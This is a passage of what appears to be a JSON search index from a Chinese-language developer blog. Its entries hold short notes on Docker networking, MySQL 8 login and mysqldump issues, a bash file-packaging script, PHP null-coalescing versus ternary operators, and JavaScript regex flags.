","date":"2019-01-09","objectID":"/blog/posts/%E9%A1%AF%E7%A4%BA%E4%B8%80%E5%80%8B%E8%B3%87%E6%96%99%E5%A4%BE%E5%85%A8%E9%83%A8%E6%AA%94%E6%A1%88%E8%B7%AF%E5%BE%91/:0:0","tags":["linux"],"title":"顯示一個資料夾全部檔案路徑","uri":"/blog/posts/%E9%A1%AF%E7%A4%BA%E4%B8%80%E5%80%8B%E8%B3%87%E6%96%99%E5%A4%BE%E5%85%A8%E9%83%A8%E6%AA%94%E6%A1%88%E8%B7%AF%E5%BE%91/"},{"categories":["網頁特效"],"content":"最近看到很猛的煙火特效 An Anonymous Pen on CodePen HTML5 canvas and javascript fireworks tutorial jquery 實現煙花特效 其他小記 有利于 SEO 的 div+css 命名全面小结烟火新浪博客 ","date":"2019-01-08","objectID":"/blog/posts/CSS%E7%8C%9B%E7%8C%9B%E7%9A%84%E7%85%99%E7%81%AB%E7%89%B9%E6%95%88%E8%92%90%E9%9B%86/:0:0","tags":["css"],"title":"CSS猛猛的煙火特效蒐集","uri":"/blog/posts/CSS%E7%8C%9B%E7%8C%9B%E7%9A%84%E7%85%99%E7%81%AB%E7%89%B9%E6%95%88%E8%92%90%E9%9B%86/"},{"categories":["CSS"],"content":"最近 jQuery 使用.siblings(':first-child + ~ '); 感覺哪裡怪怪的 前陣子我踩了div :hover地雷(我心中所想的是div:hover) 結果差很多… 太少寫 CSS 犯了低級的錯誤…. 但我今天看到這個.siblings(':first-child + ~');怎麼可以跑….. 其實我猜測在做~+的時候前後空白會被忽略 因為之前不小心寫div :hover 我覺得正常前後不要空白比較好 雖然我還沒看到相關文件有說前後可以空白 不過自己實驗~+前後空白不會有這個問題 最後無聊提醒[CSS] 不常用的 CSS Selectors 筆記 | 程式狂想筆記 jQuery 的 siblings 跟 CSS 的~是不一樣的 jQuery 的 siblings 是除了自己本身 selector 同階層都會抓到 但是 CSSxxx~是 xxx 後面屬性都會抓到 element1+跟element1~都可以跑 好奇怪為什麼這樣還是可以跑 目前猜測後面沒寫element1+，會自動帶* 所以跟結果element1+*一樣 不過我還是沒有找到文章 日後看到會再補充 最後我自己又重新看 code 一次 .siblings(':first-child + ~'); 其實我這個寫法可以這樣寫.siblings(':first-child~'); 甚至可以用 jQuerynotfunction 使用 .siblings().not(:first-child); 我很少用複查的寫法 這個 js 用途是用在做多列 table，點擊一個按鈕，需要把其他列資料隱藏起來 所以才用這個方法 但我最近發現 table 結構 \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003e標題\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003etest\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e 其實這樣編排的話不需要做這麼複雜的事情 我可以對 tbody 做比較不需要寫複雜的 code 不過說真的 thead 跟 tbody 沒寫的時候 瀏覽器其實會幫你建立的 這通常自己會忘記(已經踩好幾次了 orz) ","date":"2019-01-08","objectID":"/blog/posts/Selector%E5%81%9A%E7%A9%BA%E7%99%BD%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":["css"],"title":"CSS Selector做空白可能要注意的事情","uri":"/blog/posts/Selector%E5%81%9A%E7%A9%BA%E7%99%BD%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["實用工具"],"content":"最近打算把筆電 elementary os 帶去公司開發 主要想把 docker 環境帶過去 但是我電腦設定 zsh 原本想共用電腦切換 但卡在滑鼠鍵盤不能共用 所以有找一些方法 USB 切換器 OR KVM (價格也不便宜) USB 拷貝線(價格不便宜，但只能用在 Window 上面…) 键盘鼠标共享效率工具-Synergy - 简书 原本最後想用 Synergy 但是我又不想使用…網路 最後看到有人說 Linux 還需要遠端嗎? ssh 就好 XDD 我覺得好像有道理 但是一般 pietty 進去 zsh 沒有 256 顏色真的醜到爆… 所以找了一些方法 網路一堆教 putty 方法，但我測試都不能用… 所以決定放棄 Help with 256 color support on Windows · Issue #1968 · zeit/hyper 原本看到這篇有安裝 hyper 但沒成功支援 256 色 工程師壓力大…看 cmd 黑白會 coding 越會黑白，舒適好看 command 才看得爽 但下面有人提到Terminus 立馬下載免安裝 Release Alpha 68 · Eugeny/terminus 設定字型hack windows 可正常跑出顏色!!! 雖然有些還不是很完美(下面不知道為什麼會多一行) 但至少顏色都出來 {% asset_img 1.jpg %} 其他參考來源: USB 对拷线设置教程 win10 下的 VSCode 用 cmder 作默认的命令终端(shell) - 简书 PowerShell 美化：oh my posh | Flymia 凡事用心之事 Oh My ZSH! with PuTTY » mordsgau.de Blog How do you do remote access? : elementaryos 判断终端色彩支持情况的方法 | 高明飞的博客 键盘鼠标共享效率工具-Synergy - 简书 Chocolatey Gallery | synergy (Install) 1.7.5 ","date":"2019-01-07","objectID":"/blog/posts/window%E5%81%9Assh%E6%9C%89%E8%BE%A6%E6%B3%95%E5%81%9A%E5%88%B0256%E9%A1%8F%E8%89%B2%E6%96%B9%E6%B3%95/:0:0","tags":["ssh"],"title":"window做ssh有辦法做到256顏色方法","uri":"/blog/posts/window%E5%81%9Assh%E6%9C%89%E8%BE%A6%E6%B3%95%E5%81%9A%E5%88%B0256%E9%A1%8F%E8%89%B2%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"之前讀到 load balance 都沒有看到如何做 DB 處理 不可能各區域都有一個 DB 吧 不過之前有跟人聊過 在部屬程式的時候，做 load balance 在每一個分流 IP 設定可以設一樣東西 不過內部 DB 要怎麼共用呢? 不過聽說可以設定讓他們導向一樣的地方 講那麼多有點離題，因為這篇也不是做 load balance docker 在不同專案 說不定也會用到共用 DB 今天是自己實驗小記 可能不會記錄很詳細 畢竟 docker network 我還是很不熟 今天找了相關 docker network 東西 但還不是很了解，有找了幾篇文章 Docker 学习与实践 - 网络篇 - Waterstrong Docker 進階實務班 放棄思考: Docker Network 及 Docker Compose 教學 首先，我實作兩個 network 出來 想辦法讓他們的 container 可以相連 docker network create test_1 docker network create test_2 docker run --name some-mysql1 -e MYSQL_ROOT_PASSWORD=root -d --network=test_1 mysql --default-authentication-plugin=mysql_native_password docker run --name some-mysql2 -e MYSQL_ROOT_PASSWORD=root -d --network=test_2 mysql --default-authentication-plugin=mysql_native_password docker run --name adminer --network=test_1 -d -p 8080:8080 adminer docker network connect test_2 adminer 主要最後重點 docker network connect network_name container_name 可以讓你的 container 連線 奇怪，docker run –network 只能塞一個 network_name 好像只透過 docker connect 才能做連結 不過 docker-compose 好像能設定兩個 network 感覺 docker network 也是一個大坑洞 之後有時間研究在筆記一下 之前聽到 k8s 可以做到 docker 監控，順便做重啟動作 剛好最近看到這個影片有介紹 COSS 103 kubernetes 介紹 教學 指令操作 - YouTube 感覺還滿好用的東西 有空來研究看看 不過我覺得 docker 先搞熟再說 ","date":"2019-01-06","objectID":"/blog/posts/docker%E5%98%97%E8%A9%A6%E8%91%97%E6%8A%8A%E5%85%A9%E5%80%8B%E4%B8%8D%E5%90%8Cnetwork-container%E5%81%9A%E9%80%A3%E7%B7%9A%E5%8B%95%E4%BD%9C/:0:0","tags":["docker"],"title":"docker嘗試著把兩個不同network container做連線動作","uri":"/blog/posts/docker%E5%98%97%E8%A9%A6%E8%91%97%E6%8A%8A%E5%85%A9%E5%80%8B%E4%B8%8D%E5%90%8Cnetwork-container%E5%81%9A%E9%80%A3%E7%B7%9A%E5%8B%95%E4%BD%9C/"},{"categories":["Docker"],"content":"MySQL 8.0 的雷 想說嘗試著用 docker 跑 mysql adminer 一直登不進去 後來仔細看了一下 docker hub 的 pwd 有多--default-authentication-plugin=mysql_native_password WTF… 因為 之前 MySQL 預設儲存密碼的方式是 mysql_native_password, 但 8.0 之後 預設的儲存方式為 caching_sha2_password, 說是又快又安全啦, 但讓人措手不及, 一堆 SQL 工具 (Navicat) 可能還來不及更新支援 就… ORZ… MySQL8 Authentication plugin Change « Sam 的程式筆記 PHP: Requirements - Manual ","date":"2019-01-06","objectID":"/blog/posts/docker%E5%98%97%E8%A9%A6%E8%91%97%E6%8A%8A%E5%85%A9%E5%80%8B%E4%B8%8D%E5%90%8Cnetwork-container%E5%81%9A%E9%80%A3%E7%B7%9A%E5%8B%95%E4%BD%9C/:1:0","tags":["docker"],"title":"docker嘗試著把兩個不同network container做連線動作","uri":"/blog/posts/docker%E5%98%97%E8%A9%A6%E8%91%97%E6%8A%8A%E5%85%A9%E5%80%8B%E4%B8%8D%E5%90%8Cnetwork-container%E5%81%9A%E9%80%A3%E7%B7%9A%E5%8B%95%E4%BD%9C/"},{"categories":["MySQL"],"content":"最近出現有 mysqldump 備份失敗問題 但也不知道是什麼原因導至失敗 不過這邊蒐集一些資訊 ","date":"2019-01-05","objectID":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","mysqldump"],"title":"mysqldump可能會失敗原因小記","uri":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"蒐集相關資料 蒐集一些資訊 mysqldump：常用操作、案例分享、意外终止的原因以及解决方法 - 记录创业路上的一些想法 - CSDN 博客 MySQL 线程处于 Waiting for table flush 的分析 - 潇湘隐者 - 博客园 Get locked tables in mysql query - Stack Overflow MySQL 线程处于 Waiting for table flush 的分析 - 潇湘隐者 - 博客园 mysql lock tables - 無執 - ITeye 博客 [MySQL 案例]之备份与 Waiting for table flush | HiDBA | 林晓嘉 MySQL 的 SQL_CALC_FOUND_ROWS - 简书 ","date":"2019-01-05","objectID":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/:1:0","tags":["mysql","mysqldump"],"title":"mysqldump可能會失敗原因小記","uri":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"簡單小記 首先有看到 processlist 有一個Waiting for table flush 目前猜測可能是做 mysqldump 的時候，做 select 查詢可能會卡住 詳細原因還不清楚 ","date":"2019-01-05","objectID":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/:2:0","tags":["mysql","mysqldump"],"title":"mysqldump可能會失敗原因小記","uri":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"備份 MySQL 方法 rsync 備份 | Tsung’s Blog 在 Linux 上，關於 Mysql 備份，什麼方式最好呢？ tar 方式好久！ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 感覺 rsync 指令好像滿好用的，改天來學一下如何用 ","date":"2019-01-05","objectID":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/:2:1","tags":["mysql","mysqldump"],"title":"mysqldump可能會失敗原因小記","uri":"/blog/posts/mysqldump%E5%8F%AF%E8%83%BD%E6%9C%83%E5%A4%B1%E6%95%97%E5%8E%9F%E5%9B%A0%E5%B0%8F%E8%A8%98/"},{"categories":["shell"],"content":"最近公司做一個專案需要手動打包程式 因為目前公司測試環境只有一個 所以那個專案放在我們公司某一個 GIT 裡面 所以很難做到用git archive打包動作… 最近因為很急著上 code 卻不小心包錯(手動複製到別的資料夾)… 人會犯錯是應該的 但同一個錯誤應該是要避免的 所以我寫了這個 shell project_path 前面路徑請注意要更改 pack_path 前面路徑看是否需要調整 window 請使用 git bash 執行，直接點兩下好像不能跑 ## 快速打包程式 # project_path 前面路徑請注意要更改 # pack_path 前面路徑看是否需要調整 # window請使用git bash執行，直接點兩下好像不能跑 project_path=/d/GIT/專案名稱/ pack_path=/d/pack/`date +%Y%m%d`/專案名稱/ echo project_path echo $project_path echo pack_path echo $pack_path rm -rf $pack_path mkdir -p $pack_path filelist=( #請放置相對程式路徑 application/controllers/*.php application/controllers/A/ABC.php ) for file in ${filelist[@]};do mkdir -p `dirname $pack_path$file` dir=(`dirname $pack_path$file`) # echo cp $project_path$file ${dir[0]} cp -f $project_path$file ${dir[0]} done 其實我也不太會寫 shell 這個只是簡單的應用 我只 Google 一下 shell 怎麼寫 Array 跟抓檔案目前資料夾路徑(dirname) 在簡單用 mkdir, cp 就做出來這個東西 從此打包程式不手殘 ","date":"2019-01-05","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/:0:0","tags":["shell","打包程式"],"title":"快速打包程式的腳本(shell)","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/"},{"categories":["PHP"],"content":"最近發現 PHP 有兩個運算子?:和?? 這兩個看起來用途很像 但我覺得一定有什麼不一樣的地方 這邊就簡單記錄他們的差別 ","date":"2019-01-05","objectID":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/:0:0","tags":["php"],"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","uri":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"?: 首先，先介紹這個符號，有些別的程式語言也可以用這個 他有專門中文名稱叫「三元運算子」 我還有一篇看他他叫貓王運算子?!!! 原來是?:反過來看很像貓王 XDD 詳細：貓王運算子 - Elvis Operator - Qiita 官方文件敘述PHP: 比较运算符 - Manual - 三元運算符 表達式 (expr1) ? (expr2) : (expr3) 在 expr1 求值為 TRUE 時的值為 expr2，在 expr1 求值為 FALSE 時的值為 expr3。 自 PHP 5.3 起，可以省略三元運算符中間那部分。表達式 expr1 ?: expr3 在 expr1 求值為 TRUE 時返回 expr1，否則返回 expr3。 ","date":"2019-01-05","objectID":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/:1:0","tags":["php"],"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","uri":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"?? 這個是我同事跟我說 PHP7.0 才可以支援使用 簡單看了一下介紹，感覺跟?:很像 但是不知道差別在哪 其實官方文件伈得很清楚PHP: 新特性 - Manual - null 合併運算符 由於日常使用中存在大量同時使用三元表達式和 isset()的情況， 我們添加了 null 合併運算符 (??) 這個語法糖。如果變量存在且值不為 NULL， 它就會返回自身的值，否則返回它的第二個操作 \u003c?php // Fetches the value of $_GET['user'] and returns 'nobody' // if it does not exist. $username = $_GET['user'] ?? 'nobody'; // This is equivalent to: $username = isset($_GET['user']) ? $_GET['user'] : 'nobody'; // Coalesces can be chained: this will return the first // defined value out of $_GET['user'], $_POST['user'], and // 'nobody'. $username = $_GET['user'] ?? $_POST['user'] ?? 'nobody'; ?\u003e 這樣來看，在??使用上會比?:來的方便，但缺點是只有在 PHP7.0 專案才能使用 ","date":"2019-01-05","objectID":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/:2:0","tags":["php"],"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","uri":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"簡單總結 其實，這兩個都非常接近，??在沒有宣告的時候不會發生錯誤，?:會發生錯誤。 但這兩個就算了解，不常使用下也很容易忘記跟部習慣… 我後來發現這種跟mysql COALESCE 取代 null 值好方法 | 程式狂想筆記有點像 當??為 null 時候就用後面的變數??，這個跟COALESCE有異曲同工之妙 所以用 SQL 這個觀念來記真的比較輕鬆 ","date":"2019-01-05","objectID":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/:3:0","tags":["php"],"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","uri":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"簡單實測紀錄 ","date":"2019-01-05","objectID":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/:4:0","tags":["php"],"title":"PHP的三元運算子(?:)跟null運併運算子(??)差別","uri":"/blog/posts/PHP%E7%9A%84%E4%B8%89%E5%85%83%E9%81%8B%E7%AE%97%E5%AD%90-%E8%B7%9Fnull%E9%81%8B%E4%BD%B5%E9%81%8B%E7%AE%97%E5%AD%90-%E5%B7%AE%E5%88%A5/"},{"categories":["Regex"],"content":"很常去搞正規化 但卻沒有認真了解裡面的事情 今天一口氣記錄 其實仔細看也沒很多(= =a) flag g Global search. i Case-insensitive search. m Multi-line search. u unicode; treat a pattern as a sequence of unicode code points y Perform a “sticky” search that matches starting at the current position in the target string. See RegExp.prototype.sticky | MDN ","date":"2019-01-02","objectID":"/blog/posts/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:0:0","tags":["regex"],"title":"Regex 豎旗(flag)的那些事情","uri":"/blog/posts/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["Regex"],"content":"心裡疑惑 其實我對g這個也滿疑惑的 什麼是全域查詢 平常用 sublime 或 vscode 都沒有這個搜尋選項 m多行模式 也讓我很疑惑，是找多行，但感覺跟g有關係 可以找多筆 regex 101 產生 JavaScript 語法 exec怎麼可以做 while 迴圈 const regex = /test/gm; const str = `test`; let m; while ((m = regex.exec(str)) !== null) { // This is necessary to avoid infinite loops with zero-width matches if (m.index === regex.lastIndex) { regex.lastIndex++; } // The result can be accessed through the `m`-variable. m.forEach((match, groupIndex) =\u003e { console.log(`Found match, group ${groupIndex}: ${match}`); }); } ","date":"2019-01-02","objectID":"/blog/posts/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:0:1","tags":["regex"],"title":"Regex 豎旗(flag)的那些事情","uri":"/blog/posts/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["Regex"],"content":"研究結果 m看是否需要一行一行搜尋，通常可能需要搭配g才能找出多行資料 一般沒用m算單行模式 從這篇來看到正則表達式之單行模式、多行模式、區分大小寫模式 - ^小七 - 博客園 備份圖 單行模式: (.)點號不匹配換行符，在 windows 中與[^\\r\\n]等價，並不是刻意匹配任意字符，在單行模式下會改變點號的含義，做到匹配任意字符 s 多行模式: 多行模式下^和$的含義會被改變，普通的含義是匹配整個字符串的開頭和結尾，在多行模式下匹配的就是每一行的行首和行尾，而\\A 和\\Z 他們的含義始終是匹配整個字符串的開頭和結尾 再看這個範例，可以看出差異Multiple Strings - Regex Tester/Debugger 簡單來說就是^xxx$才會看出差異 g其實跟持續搜尋有關係(如:js)，但是 php 會用不同函式(preg_match_all,preg_match)，可以自己玩玩看 regex101 可參考:[ JS 进阶 ] test, exec, match, replace - kraaas 前端博客 - SegmentFault 思否 var reg = /\\d/; //第一次匹配 console.log(reg.exec('a123')); console.log(reg.lastIndex); //输出 [\"1\"] 0 第二次匹配 console.log(reg.exec('a123')); console.log(reg.lastIndex); //输出 [\"1\"] 0 var reg = /\\d/g; //第一次匹配 console.log(reg.exec('a123')); console.log(reg.lastIndex); //输出 [\"1\"] 2 第二次匹配 console.log(reg.exec('a123')); console.log(reg.lastIndex); //输出 [\"2\"] 3 第三次匹配 console.log(reg.exec('a123')); console.log(reg.lastIndex); //输出 [\"3\"] 4 第四匹配 console.log(reg.exec('a123')); console.log(reg.lastIndex); //输出 null 0 regex 物件有 exec,test，參數是帶 string string 型態有 match，參數是帶 regex 要注意 regex exec 跟 test 都吃gflag test 回傳只會傳 true,false exec 回傳比較特殊，傳回來是一個 array 当设置全局标志的正则使用 test | MDN 感覺一不小心結果會得到不一樣的結果 unicode、sticky 好像都是 ES6 東西，先暫時不研究。 正则的扩展 - ECMAScript 6 入门 Edit fiddle - JSFiddle [JS] RegExp 參數的正確姿勢 備份圖 正则表达式多行匹配及声明标识 - hongweigg 的专栏 - CSDN 博客 正则表达式之单行模式、多行模式、区分大小写模式 - ^小七 - 博客园 ","date":"2019-01-02","objectID":"/blog/posts/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/:0:2","tags":["regex"],"title":"Regex 豎旗(flag)的那些事情","uri":"/blog/posts/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/"},{"categories":["MySQL"],"content":"小記網路看到的好文章 ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:0:0","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"Mysql 好文 我必须得告诉大家的 MySQL 优化原理 - 简书 備份圖 我必须得告诉大家的 MySQL 优化原理 2 - 简书 備份圖 我必须得告诉你的 MySQL 优化原理 3 - 简书 備份圖 jobbole/awesome-mysql-cn: MySQL 资源大全中文版，分析工具、备份、性能测试、配置、部署、GUI 等 ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:1:0","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"Sharding MySql 從一竅不通到入門（五）Sharding：分表、分庫、分片和分割槽 - IT 閱讀 MySQL Sharding 详解 - 简书 MongoDB Sharding 分散式儲存架構建置 (概念篇) - Soul \u0026 Shell Blog ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:2:0","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"mariadb sipder(mysql sharding) Spider 引擎分布式数据库解决方案（最全的 spider 教程） - 简书 備份圖 aipescience/spider-docker: Docker files for a Spider-Engine MariaDB cluster MySQL 原生的分库分表方案 - Spider 存储引擎 - 知乎 MySQL 存储引擎之 Spider 内核深度解析-云栖社区-阿里云 MySQL 中间件 Spider 引擎问题集锦 - 简书 這邊我有自已用aipescience/spider-docker: Docker files for a Spider-Engine MariaDB cluster 做一個簡單環境 再搭配了Spider 引擎分布式数据库解决方案（最全的 spider 教程） - 简书教學做出一個 Sipder 環境 使用結論：在使用 Sipder 做 alter table 時候，後面的 DB 不會跟著改變 必須各別調整，在管理上面感覺不會非常方便 不知道是不是有很好用的部屬工具可以解決? Cluster 和 HA 的差別 Server NLB 和 Cluster 架構 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:2:1","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"binlog 初探 MySQL 的 Binlog · 一个伪宅级别的码畜。 MySQL 使用 binary log 回復 某段時間區間 的資料 | Tsung’s Blog 腾讯工程师带你深入解析 MySQL binlog - 知乎 adalf 的小技巧: [MySQL]查看 Binlog 的內容 ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:3:0","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"RabbitMQ kafka Kafka、RabbitMQ、RocketMQ 之间的区别是什么 ? - 知乎 消息中间件部署及比较：rabbitMQ、activeMQ、zeroMQ、rocketMQ、Kafka、redis - 掘金 ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:4:0","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"kafka 使用 Docker 快速搭建 Kafka 开发环境 | Tomoya’s Blog Kafka 深度解析 | 技术世界 | kafka,大数据,集群,kafka 架构,技术世界,郭俊 Jason,大数据架构,Kafka HA,kafka benchmark,kafka split brain,kafka 脑裂 在 Docker 上运行 Apache Kafka - DockOne.io [Day06] Kaggle 的解題挑戰 - Kafka 實作 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2018-12-27","objectID":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/:4:1","tags":["mysql"],"title":"MySQL不錯優化文章\u0026DB雜記","uri":"/blog/posts/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/"},{"categories":["MySQL"],"content":"平常我都是用 date() 但今天看到程式使用 date_format() 好奇這兩個差異 其實下面兩個都可以顯示時間 參數第一個不管用 date,datetime 都不會有錯誤問題 sql - How to optimize mysql group by with DATE_FORMAT - Stack Overflow 效能上其實兩者沒太大差別(如上連結) select date_format( '2018-01-32 00:00:00' + INTERVAL 1 DAY,'%Y%-%m-%d'); select date( '2018-01-32 00:00:00'); 之後有發現甚麼在來記錄 參考連結 MySQL Date Format: What Datatype Should You Use? We Compare Datetime, Timestamp and INT. Re: [SQL ] mysql date column index 問題 - 看板 Database - 批踢踢實業坊 mysql date comparison with date_format - Stack Overflow MySQL :: MySQL 8.0 Reference Manual :: 12.7 Date and Time Functions MySQL :: MySQL 5.5 Reference Manual :: 9.1.3 Date and Time Literals mysql 日期与 dateformat 的比较_date帮酷编程问答 (MySQL) | Online editor and compiler mysql 时间字段性能比较 - u011820505的博客 - CSDN博客 ","date":"2018-12-24","objectID":"/blog/posts/mysql-date%E5%92%8Cdate-format%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql"],"title":"mysql 